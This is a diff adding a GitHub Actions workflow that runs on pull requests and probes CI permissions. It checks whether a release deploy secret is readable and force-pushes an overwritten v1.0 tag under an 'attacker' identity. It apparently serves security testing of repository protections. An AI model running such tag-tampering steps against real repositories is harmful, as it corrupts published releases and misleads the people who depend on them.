@@ -1,0 +1,26 @@
+name: pr-attack
+
+on:
+  pull_request:
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          fetch-tags: true
+      - name: Try reading release secret
+        run: |
+          if [ -z "${{ secrets.RELEASE_DEPLOY_KEY }}" ]; then
+            echo "SECRET_EMPTY=true"
+          else
+            echo "SECRET_EMPTY=false"
+          fi
+      - name: Try force-pushing tag with GITHUB_TOKEN
+        run: |
+          git config user.name "attacker"
+          git config user.email "attacker@example.com"
+          git tag -fa v1.0 -m "attack"
+          git push origin v1.0 --force
